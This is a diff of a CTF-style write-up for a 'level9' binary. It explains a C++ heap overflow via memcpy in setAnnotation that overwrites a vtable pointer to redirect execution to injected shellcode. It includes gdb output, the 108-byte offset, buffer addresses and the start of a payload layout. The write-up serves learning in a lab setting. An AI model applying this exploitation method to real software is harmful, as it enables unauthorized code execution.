@@ -95,49 +95,6 @@ c++filt _Znwj
 operator new(unsigned int)
 ```
 
-
-The program dereference (reads it) EAX 2 times at main+136 and there is a call on EDX at main+159
-
-```bash
-(gdb) info functions
-[...]
-0x08048510  memcpy
-0x08048510  memcpy@plt
-[...]
-```
-
-## Getting acces to the pass
-
-Our goal : 
-1. Overflow of the buffer in setAnnotation
-2. EAX now points to that object. 
-3. The programm does a double dereference on EAX to retrive the pointer of a function
-4. Thanks to the overflow, this pointer is replaced by the address of our shellcode which we injected in the buffer
-5. The edx call, calls our malicious function. 
-
-
-### Overflow of the buffer in setAnnotation → overwrriting in the objects memory
-
-There is a memcpy call, we can overflow
-
-   1.1 Finding the offset
-
-```bash 
-(gdb) run "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
-Starting program: /home/user/level9/level9 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
-
-Program received signal SIGSEGV, Segmentation fault.
-0x08048682 in main ()
-(gdb) info register eax
-eax            0x41366441	1094083649
-```
-
-So our offet is : 
-0x41366441 --> 108
-
-
-   1.2 Finding where is our buffer in eax
-
 This is the part that is interesting for us :
 
 ```bash
@@ -162,8 +119,28 @@ So schematise here is what will happen :
 *ptrB= vtable           || 0x804a100    → 0xdeadbeef (adresse fonction virtuelle)              
 ``` 
 
-So our goal is going to make the vtable address point towards a shellcode
+So our goal is going to make the vtable address point towards a shellcode. 
 
+## Getting acces to the pass
+
+Our goal : 
+1. Overflow of the memcpy used in setAnnotation 
+2. Overwrite the vtable of the B object --> make it point to a shellcode  
+
+
+
+```bash 
+(gdb) run "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+Starting program: /home/user/level9/level9 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+(gdb) info register eax
+eax            0x41366441	1094083649
+```
+
+So our offet is : 
+0x41366441 --> 108
 
 ```bash 
 (gdb) b *main+136                                    // Just after the setAnnotation() call
@@ -173,13 +150,11 @@ Starting program: /home/user/level9/level9 'AAAA'
 
 Breakpoint 1, 0x0804867c in main ()
 (gdb) x $eax
-0x804a00c:      0x41414141                           // buffer address
+0x804a00c:      0x41414141                           // address of the a object where annotation start
 ```
-
 So we will inject our shellcode at this address. 
 
-## Making the Payload
-
+## Making the payload
 
 [esp+0x10] → pointer to 0x804a00c --> \x10\xa0\x04\x08
 0x804a00c → pointer to 0x804a010 (0x804a00c + 4) (shellcode) --> \x0c\xa0\x04\x08
